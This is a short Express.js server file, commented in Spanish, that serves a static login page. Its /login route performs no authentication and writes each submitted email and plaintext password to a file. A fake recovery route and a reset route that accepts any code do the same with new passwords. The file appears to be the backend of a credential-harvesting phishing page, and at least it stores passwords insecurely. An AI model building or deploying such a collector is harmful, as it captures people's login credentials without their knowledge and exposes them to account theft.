const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { PORT, SAVE_PATH } = require('./env');

const app = express();

// Middlewares
app.use(cors());
app.use(bodyParser.json());

// Servir archivos estáticos desde /public (incluye index.html)
app.use(express.static(path.join(__dirname, 'public')));

// Ya NO necesitas esta ruta explícita, express.static sirve index.html automáticamente
// app.get('/', (req, res) => {
//   res.sendFile(path.join(__dirname, 'public', 'index.html'));
// });

// Ruta para iniciar sesión
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Correo o contraseña faltante' });
  }
  const userData = {
    email,
    password,
    timestamp: new Date().toISOString()
  };
  try {
    fs.writeFileSync(
      path.resolve(__dirname, SAVE_PATH),
      JSON.stringify(userData, null, 2),
      'utf-8'
    );
    res.status(200).json({ message: 'Inicio de sesión guardado correctamente' });
  } catch (error) {
    res.status(500).json({ error: 'Error interno del servidor' });
  }
});

// Recuperación
app.post('/recover', (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: 'Correo requerido' });
  res.json({ message: `Código enviado a ${email}` });
});

// Resetear contraseña
app.post('/reset-password', (req, res) => {
  const { email, code, newPassword } = req.body;
  if (!email || !code || !newPassword) {
    return res.status(400).json({ error: 'Datos incompletos' });
  }
  const updatedData = {
    email,
    password: newPassword,
    reset: true,
    timestamp: new Date().toISOString()
  };
  try {
    fs.writeFileSync(
      path.resolve(__dirname, SAVE_PATH),
      JSON.stringify(updatedData, null, 2),
      'utf-8'
    );
    res.json({ message: 'Contraseña actualizada correctamente' });
  } catch (error) {
    res.status(500).json({ error: 'No se pudo guardar la nueva contraseña' });
  }
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`Servidor iniciado en http://localhost:${PORT}`);
});
